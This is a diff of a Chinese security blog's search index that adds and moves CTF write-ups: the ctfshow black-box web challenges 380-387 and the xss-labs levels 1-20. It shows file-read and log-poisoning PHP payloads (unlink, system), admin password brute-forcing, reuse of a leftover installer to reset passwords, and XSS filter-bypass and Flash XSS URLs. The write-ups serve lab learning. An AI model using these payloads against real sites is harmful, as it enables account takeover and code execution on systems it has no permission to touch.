-<p>直接在 n 处注入无效</p>
-<p>尝试<code>?id=</code>处注入</p>
-<p>发现报错</p>
-<p><code>file_get_contents(1'.php)</code></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221018212038190.png" alt="image-20221018212038190" /></p>
-<p>直接读取 flag<code>?id=flag</code></p>
-<p>flag 出现</p>
-<h2 id="web381"><a class="markdownIt-Anchor" href="#web381"></a> web381</h2>
-<p>再次尝试上题思路，发现无回显</p>
-<p>再次翻看源码</p>
-<p>发现到 css 文件中出现了一个特殊地址</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221018212406542.png" alt="image-20221018212406542" /></p>
-<p>尝试打开，之后回退文件地址</p>
-<p>直到退至/alsckdfy/出现 flag</p>
-<blockquote>
-<p>一些文件的调用可能会来自某些特殊的地址</p>
-<p>如本题中后台和前站共用同一个 css 文件</p>
-<p>其他如通过 cdn、图床等溯源回网上仓库（github 等）</p>
-<p>即可查到源码，或找到后台等特殊地址</p>
-</blockquote>
-<h2 id="web382-383"><a class="markdownIt-Anchor" href="#web382-383"></a> web382-383</h2>
-<p>继续访问上题出现的后台地址</p>
-<p>发现出现了个后台登陆界面</p>
-<p>既然难度是梯度上升</p>
-<p>可以考虑弱密码或者万能密码</p>
-<p>进入</p>
-<p>flag get√</p>
-<h2 id="web384"><a class="markdownIt-Anchor" href="#web384"></a> web384</h2>
-<blockquote>
-<p>hint:密码前 2 位是小写字母，后三位是数字</p>
-</blockquote>
-<p>再次进入后台登录页面</p>
-<p>用户名肯定是 admin</p>
-<p>然后就是爆破密码</p>
-<p>方法一：写个脚本生成密码字典</p>
-<p>方法二：使用 burp 爆破时</p>
-<p>将 password 设为两个变量</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221019153048062.png" alt="image-20221019153048062" /></p>
-<p>$1 设置成小写字母长度：2</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221019153017681.png" alt="image-20221019153017681" /></p>
-<p>$2 设置成 3 位数字</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221019153029106.png" alt="image-20221019153029106" /></p>
-<p><code>password=xy123</code></p>
-<h2 id="web385"><a class="markdownIt-Anchor" href="#web385"></a> web385</h2>
-<p>登陆界面进不去</p>
-<p>扫目录</p>
-<p>发现有 install 没删</p>
-<p>重置管理员密码</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221028144108992.png" alt="image-20221028144108992" /></p>
-<blockquote>
-<p>一些网页模板的安装通常通过/install 目录进行安装</p>
-<p>部分开发人员忘记删除 install 等目录就会暴露出一些特殊的功能点</p>
-<p>如重置密码功能点</p>
-<p>模板名、版本号、配置信息等敏感信息</p>
-</blockquote>
-<p>重置后密码为 admin888</p>
-<h2 id="web386"><a class="markdownIt-Anchor" href="#web386"></a> web386</h2>
-<p>再次访问 install 发现有个 lock.bat 给锁定住了</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221028151039705.png" alt="image-20221028151039705" /></p>
-<p>最开始几道题是前端用了后端文件</p>
-<p>这题回去访问前端的同名文件 即本来应该调用的前端页面</p>
-<p>发现第一行注释</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221028150737179.png" alt="image-20221028150737179" /></p>
-<p>访问 clear ：“清理成功”</p>
-<p>回想到，install 里的 lock，直接删</p>
-<p><code>clear.php?file=./install/lock.dat</code></p>
-<p>这次访问 install 能重置了</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221028151345438.png" alt="image-20221028151345438" /></p>
-<p>返回后台登录初始账户</p>
-<h2 id="387"><a class="markdownIt-Anchor" href="#387"></a> 387</h2>
-<p>发现 robots</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221028151846193.png" alt="image-20221028151846193" /></p>
-<p>提示 debug，访问</p>
-<p>提示 file 不存在</p>
-<p>尝试 get 进去个 file</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221028152040695.png" alt="image-20221028152040695" /></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221028152143283.png" alt="image-20221028152143283" /></p>
-<p>使用 log 执行命令将 lock 删除</p>
-<p><code>&lt;?php unlink('/var/www/html/install/lock.dat')；?&gt;</code></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221028155008033.png" alt="image-20221028155008033" /></p>
-<p>还有种执行方式是将命令通过读取文件显示回显</p>
-<p><code>&lt;?php system('==shell== &gt; /var/www/html/1.txt');?&gt;</code></p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>git命令</title>
     <url>/2022/02/git/</url>
     <content><![CDATA[<h2 id="创建仓库命令"><a class="markdownIt-Anchor" href="#创建仓库命令"></a> 创建仓库命令</h2>
@@ -2381,6 +2281,106 @@ ai说post那个地方可以用</p>
         <tag>web</tag>
         <tag>HackTheBox</tag>
         <tag>htb-Shoppy</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfshow黑盒测试</title>
+    <url>/2023/01/ctfshow%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<h2 id="web380"><a class="markdownIt-Anchor" href="#web380"></a> web380</h2>
+<p>先看源码没发现啥</p>
+<p>然后再点点看看功能</p>
+<p>发现文章页的格式为</p>
+<p><code>page_n.php</code></p>
+<p>猜测为 sql 注入</p>
+<p>直接在 n 处注入无效</p>
+<p>尝试<code>?id=</code>处注入</p>
+<p>发现报错</p>
+<p><code>file_get_contents(1'.php)</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221018212038190.png" alt="image-20221018212038190" /></p>
+<p>直接读取 flag<code>?id=flag</code></p>
+<p>flag 出现</p>
+<h2 id="web381"><a class="markdownIt-Anchor" href="#web381"></a> web381</h2>
+<p>再次尝试上题思路，发现无回显</p>
+<p>再次翻看源码</p>
+<p>发现到 css 文件中出现了一个特殊地址</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221018212406542.png" alt="image-20221018212406542" /></p>
+<p>尝试打开，之后回退文件地址</p>
+<p>直到退至/alsckdfy/出现 flag</p>
+<blockquote>
+<p>一些文件的调用可能会来自某些特殊的地址</p>
+<p>如本题中后台和前站共用同一个 css 文件</p>
+<p>其他如通过 cdn、图床等溯源回网上仓库（github 等）</p>
+<p>即可查到源码，或找到后台等特殊地址</p>
+</blockquote>
+<h2 id="web382-383"><a class="markdownIt-Anchor" href="#web382-383"></a> web382-383</h2>
+<p>继续访问上题出现的后台地址</p>
+<p>发现出现了个后台登陆界面</p>
+<p>既然难度是梯度上升</p>
+<p>可以考虑弱密码或者万能密码</p>
+<p>进入</p>
+<p>flag get√</p>
+<h2 id="web384"><a class="markdownIt-Anchor" href="#web384"></a> web384</h2>
+<blockquote>
+<p>hint:密码前 2 位是小写字母，后三位是数字</p>
+</blockquote>
+<p>再次进入后台登录页面</p>
+<p>用户名肯定是 admin</p>
+<p>然后就是爆破密码</p>
+<p>方法一：写个脚本生成密码字典</p>
+<p>方法二：使用 burp 爆破时</p>
+<p>将 password 设为两个变量</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221019153048062.png" alt="image-20221019153048062" /></p>
+<p>$1 设置成小写字母长度：2</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221019153017681.png" alt="image-20221019153017681" /></p>
+<p>$2 设置成 3 位数字</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221019153029106.png" alt="image-20221019153029106" /></p>
+<p><code>password=xy123</code></p>
+<h2 id="web385"><a class="markdownIt-Anchor" href="#web385"></a> web385</h2>
+<p>登陆界面进不去</p>
+<p>扫目录</p>
+<p>发现有 install 没删</p>
+<p>重置管理员密码</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221028144108992.png" alt="image-20221028144108992" /></p>
+<blockquote>
+<p>一些网页模板的安装通常通过/install 目录进行安装</p>
+<p>部分开发人员忘记删除 install 等目录就会暴露出一些特殊的功能点</p>
+<p>如重置密码功能点</p>
+<p>模板名、版本号、配置信息等敏感信息</p>
+</blockquote>
+<p>重置后密码为 admin888</p>
+<h2 id="web386"><a class="markdownIt-Anchor" href="#web386"></a> web386</h2>
+<p>再次访问 install 发现有个 lock.bat 给锁定住了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221028151039705.png" alt="image-20221028151039705" /></p>
+<p>最开始几道题是前端用了后端文件</p>
+<p>这题回去访问前端的同名文件 即本来应该调用的前端页面</p>
+<p>发现第一行注释</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221028150737179.png" alt="image-20221028150737179" /></p>
+<p>访问 clear ：“清理成功”</p>
+<p>回想到，install 里的 lock，直接删</p>
+<p><code>clear.php?file=./install/lock.dat</code></p>
+<p>这次访问 install 能重置了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221028151345438.png" alt="image-20221028151345438" /></p>
+<p>返回后台登录初始账户</p>
+<h2 id="387"><a class="markdownIt-Anchor" href="#387"></a> 387</h2>
+<p>发现 robots</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221028151846193.png" alt="image-20221028151846193" /></p>
+<p>提示 debug，访问</p>
+<p>提示 file 不存在</p>
+<p>尝试 get 进去个 file</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221028152040695.png" alt="image-20221028152040695" /></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221028152143283.png" alt="image-20221028152143283" /></p>
+<p>使用 log 执行命令将 lock 删除</p>
+<p><code>&lt;?php unlink('/var/www/html/install/lock.dat')；?&gt;</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20221028155008033.png" alt="image-20221028155008033" /></p>
+<p>还有种执行方式是将命令通过读取文件显示回显</p>
+<p><code>&lt;?php system('==shell== &gt; /var/www/html/1.txt');?&gt;</code></p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctfshow</tag>
       </tags>
   </entry>
   <entry>
@@ -3384,6 +3384,116 @@ urlencode(’) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，M
       </tags>
   </entry>
   <entry>
+    <title>xss-lab</title>
+    <url>/2022/03/xsslab/</url>
+    <content><![CDATA[<h2 id="level-1"><a class="markdownIt-Anchor" href="#level-1"></a> level 1</h2>
+<p>没啥好说的<br />
+直接 alert<br />
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254223669-151.png" alt="在这里插入图片描述" /></p>
+<h2 id="level-2"><a class="markdownIt-Anchor" href="#level-2"></a> level 2</h2>
+<figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki github-dark"><code><span class="line"><span style="color: #E1E4E8">&lt;</span><span style="color: #85E89D">input</span><span style="color: #E1E4E8"> </span><span style="color: #B392F0">name</span><span style="color: #E1E4E8">=</span><span style="color: #9ECBFF">keyword</span><span style="color: #E1E4E8">  </span><span style="color: #B392F0">value</span><span style="color: #E1E4E8">=</span><span style="color: #9ECBFF">&quot;test&quot;</span><span style="color: #E1E4E8">&gt;</span></span>
+<span class="line"><span style="color: #E1E4E8">//改后是</span></span>
+<span class="line"><span style="color: #E1E4E8">&lt;</span><span style="color: #85E89D">input</span><span style="color: #E1E4E8"> </span><span style="color: #B392F0">name</span><span style="color: #E1E4E8">=</span><span style="color: #9ECBFF">keyword</span><span style="color: #E1E4E8">  </span><span style="color: #B392F0">value</span><span style="color: #E1E4E8">=</span><span style="color: #9ECBFF">&quot;1111&quot;</span><span style="color: #E1E4E8">&gt;&lt;</span><span style="color: #85E89D">script</span><span style="color: #E1E4E8">&gt;……</span><span style="color: #F97583">&gt;</span><span style="color: #6A737D">//</span></span>
+<span class="line"><span style="color: #79B8FF">1111</span><span style="color: #9ECBFF">&quot;&gt;&lt;script&gt;……这是输入的部</span><span style="color: #FDAEB7; font-style: italic">分</span></span>
+<span class="line"><span style="color: #E1E4E8">前后闭合</span></span></code></pre></div></div></figure>
+<h2 id="level-3"><a class="markdownIt-Anchor" href="#level-3"></a> level 3</h2>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254225731-154.png" alt="在这里插入图片描述" /><br />
+用了 htmlspeialchars()函数 &lt;&gt;&quot;都被过滤<br />
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254227235-157.png" alt="在这里插入图片描述" />二者都写可以</p>
+<h2 id="level-4"><a class="markdownIt-Anchor" href="#level-4"></a> level 4</h2>
+<p>和上面一样</p>
+<h2 id="level-5"><a class="markdownIt-Anchor" href="#level-5"></a> level 5</h2>
+<p>on 和 script 都被过滤<br />
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254229213-160.png" alt="在这里插入图片描述" />这里用 javascript:伪协议<br />
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254230943-163.png" alt="在这里插入图片描述" />出来的链接就是答案</p>
+<h2 id="level-6"><a class="markdownIt-Anchor" href="#level-6"></a> level 6</h2>
+<p>可以大小写绕过</p>
+<h2 id="level-7"><a class="markdownIt-Anchor" href="#level-7"></a> level 7</h2>
+<p>把特殊字符便空了<br />
+可以双写绕过</p>
+<h2 id="level-8"><a class="markdownIt-Anchor" href="#level-8"></a> level 8</h2>
+<p>这关卡的死死的<br />
+要编码绕过<br />
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254233662-166.png" alt="" /></p>
+<h2 id="level-9"><a class="markdownIt-Anchor" href="#level-9"></a> level 9</h2>
+<p>strpos 函数看是否有 http://<br />
+验证是否为安全连接<br />
+但是没有限定位置<br />
+要编码下<br />
+还要把 <a href="http://xn--fqrv31bujbhw2ayl4b//%E6%B3%A8%E9%87%8A%E6%8E%89">http://放最后面用//注释掉</a><br />
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254238979-169.png" alt="在这里插入图片描述" /></p>
+<h2 id="level-10-13"><a class="markdownIt-Anchor" href="#level-10-13"></a> level 10-13</h2>
+<p>页面没有注入点<br />
+看源代码发现隐藏的表单<br />
+要改为文本框 text</p>
+<figure class="shiki css"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki github-dark"><code><span class="line"><span style="color: #E1E4E8">type=&quot;text&quot; onclick=&quot;alert(1)&quot;</span></span></code></pre></div></div></figure>
+<p>后面几关都要改 t_sort<br />
+因为后端获取 t_sort 和 user-agent 等<br />
+要从相应注入点注入<br />
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254242198-172.png" alt="在这里插入图片描述" /></p>
+<h2 id="level-14"><a class="markdownIt-Anchor" href="#level-14"></a> level 14</h2>
+<blockquote>
+<p>exif xss 漏洞，exif 是可交换图像文件格式（英语：Exchangeable image file format，官方简称 Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。我们右键图片选择属性，点击详细信息就可以看到 exif 的相关属性。</p>
+<p>喜欢摄影的应该都知道一张照片可以看快门时间 快门次数等很多参数<br />
+甚至有些照片能看到经纬度<br />
+这关要用到<br />
+<a href="http://ww1.exifviewer.org/">exifviewer</a>网页<br />
+但是<br />
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254247114-178.png" alt="在这里插入图片描述" /> &gt; <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254245020-175.png" alt="在这里插入图片描述" /></p>
+</blockquote>
+<h2 id="level-15"><a class="markdownIt-Anchor" href="#level-15"></a> level 15</h2>
+<h2 id="level-16"><a class="markdownIt-Anchor" href="#level-16"></a> level 16</h2>
+<p>对 script、/、空格进行了转换<br />
+空格不可以就用换行符</p>
+<figure class="shiki css"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki github-dark"><code><span class="line"><span style="color: #E1E4E8">&lt;a%0atype=&quot;text&quot;%0a&quot;alert&quot;</span><span style="color: #F97583">&gt;</span></span></code></pre></div></div></figure>
+<h2 id="level-17-18"><a class="markdownIt-Anchor" href="#level-17-18"></a> level 17-18</h2>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254252815-181.png" alt="在这里插入图片描述" /><br />
+火狐不支持 swf 格式<br />
+把链接加网页上显示出这样<br />
+很奇怪<br />
+开始整套娃了<br />
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254256501-184.png" alt="在这里插入图片描述" /></p>
+<p>要找个支持 flash 的浏览器才能正常打开<br />
+17-20 关都能用 flash xss<br />
+<a href="https://www.secpulse.com/archives/44299.html">flash xss 原理</a><br />
+但这里先用别的办法<br />
+以 18 关为例<br />
+注入点可以在 arg02<br />
+但是你连 swf 都没有哪来的 moouseover 哪<br />
+所以得 url 连接一下</p>
+<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki github-dark"><code><span class="line"><span style="color: #E1E4E8">http:</span><span style="color: #F97583">//</span><span style="color: #79B8FF">127.0</span><span style="color: #E1E4E8">.0.1</span><span style="color: #F97583">/</span><span style="color: #E1E4E8">xss</span><span style="color: #F97583">-</span><span style="color: #E1E4E8">labs</span><span style="color: #F97583">/</span><span style="color: #E1E4E8">level18.php</span><span style="color: #F97583">/</span><span style="color: #E1E4E8">xsf02.swf</span><span style="color: #FDAEB7; font-style: italic">?</span><span style="color: #E1E4E8">a</span><span style="color: #F97583">=</span><span style="color: #FDAEB7; font-style: italic">?</span><span style="color: #E1E4E8">arg01</span><span style="color: #F97583">=</span><span style="color: #E1E4E8">a</span><span style="color: #F97583">&amp;</span><span style="color: #E1E4E8">arg02</span><span style="color: #F97583">=%</span><span style="color: #FDAEB7; font-style: italic">20onmouseover</span><span style="color: #F97583">=</span><span style="color: #E1E4E8">javascript:alert(</span><span style="color: #79B8FF">1</span><span style="color: #E1E4E8">)</span></span></code></pre></div></div></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254258261-187.png" alt="在这里插入图片描述" /></p>
+<h2 id="level-19-20"><a class="markdownIt-Anchor" href="#level-19-20"></a> level 19-20</h2>
+<p><a href="https://www.cnblogs.com/-qing-/p/10853379.html">Flash XSS 漏洞快速上手</a><br />
+<a href="https://www.secpulse.com/archives/44299.html">flash xss 原理</a><br />
+<a href="https://github.com/jindrapetrik/jpexs-decompiler">flash 反编译工具</a><br />
+以下是大佬的 payload</p>
+<blockquote>
+<p>卑微小杨在线 emo<br />
+flash 反编译也不懂<br />
+等有空了再研究吧<br />
+好多困难等着被克服那<br />
+这次没支持 flash 的浏览器真没法做</p>
+<p>18 关</p>
+</blockquote>
+<figure class="shiki css"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki github-dark"><code><span class="line"><span style="color: #E1E4E8">http: //10</span><span style="color: #B392F0">.0.1</span><span style="color: #E1E4E8">.83/xsslab/level19.php?arg01=version&amp;arg02=&lt;</span><span style="color: #85E89D">a</span><span style="color: #E1E4E8"> href=&quot;javascript:alert(/bmfx/)&quot;</span><span style="color: #F97583">&gt;</span><span style="color: #E1E4E8">bmfx&lt;/</span><span style="color: #85E89D">a</span><span style="color: #F97583">&gt;</span><span style="color: #E1E4E8"> ;</span></span></code></pre></div></div></figure>
+<p>19 关</p>
+<figure class="shiki css"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki github-dark"><code><span class="line"><span style="color: #E1E4E8">http: ; //10</span><span style="color: #B392F0">.0.1</span><span style="color: #E1E4E8">.83/xsslab/level20.php?arg01=id&amp;arg02=bmfx</span><span style="color: #79B8FF">\&quot;</span><span style="color: #E1E4E8">))}catch(e){</span><span style="color: #79B8FF">alert</span><span style="color: #E1E4E8">(/</span><span style="color: #79B8FF">bmfx</span><span style="color: #E1E4E8">/)}//%26width=998%26height=998</span></span></code></pre></div></div></figure>
+<script>
+setTimeout(function () {
+    alert('xss');
+}, 1000);
+</script>]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>xss</tag>
+        <tag>xss-lab</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>upload-labs</title>
     <url>/2022/03/upload-labs/</url>
     <content><![CDATA[<h2 id="pass-01"><a class="markdownIt-Anchor" href="#pass-01"></a> pass-01</h2>
@@ -4019,116 +4129,6 @@ urlencode(’) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，M
         <tag>vue</tag>
         <tag>gin</tag>
         <tag>golang</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>xss-lab</title>
-    <url>/2022/03/xsslab/</url>
-    <content><![CDATA[<h2 id="level-1"><a class="markdownIt-Anchor" href="#level-1"></a> level 1</h2>
-<p>没啥好说的<br />
-直接 alert<br />
-<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254223669-151.png" alt="在这里插入图片描述" /></p>
-<h2 id="level-2"><a class="markdownIt-Anchor" href="#level-2"></a> level 2</h2>
-<figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki github-dark"><code><span class="line"><span style="color: #E1E4E8">&lt;</span><span style="color: #85E89D">input</span><span style="color: #E1E4E8"> </span><span style="color: #B392F0">name</span><span style="color: #E1E4E8">=</span><span style="color: #9ECBFF">keyword</span><span style="color: #E1E4E8">  </span><span style="color: #B392F0">value</span><span style="color: #E1E4E8">=</span><span style="color: #9ECBFF">&quot;test&quot;</span><span style="color: #E1E4E8">&gt;</span></span>
-<span class="line"><span style="color: #E1E4E8">//改后是</span></span>
-<span class="line"><span style="color: #E1E4E8">&lt;</span><span style="color: #85E89D">input</span><span style="color: #E1E4E8"> </span><span style="color: #B392F0">name</span><span style="color: #E1E4E8">=</span><span style="color: #9ECBFF">keyword</span><span style="color: #E1E4E8">  </span><span style="color: #B392F0">value</span><span style="color: #E1E4E8">=</span><span style="color: #9ECBFF">&quot;1111&quot;</span><span style="color: #E1E4E8">&gt;&lt;</span><span style="color: #85E89D">script</span><span style="color: #E1E4E8">&gt;……</span><span style="color: #F97583">&gt;</span><span style="color: #6A737D">//</span></span>
-<span class="line"><span style="color: #79B8FF">1111</span><span style="color: #9ECBFF">&quot;&gt;&lt;script&gt;……这是输入的部</span><span style="color: #FDAEB7; font-style: italic">分</span></span>
-<span class="line"><span style="color: #E1E4E8">前后闭合</span></span></code></pre></div></div></figure>
-<h2 id="level-3"><a class="markdownIt-Anchor" href="#level-3"></a> level 3</h2>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254225731-154.png" alt="在这里插入图片描述" /><br />
-用了 htmlspeialchars()函数 &lt;&gt;&quot;都被过滤<br />
-<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254227235-157.png" alt="在这里插入图片描述" />二者都写可以</p>
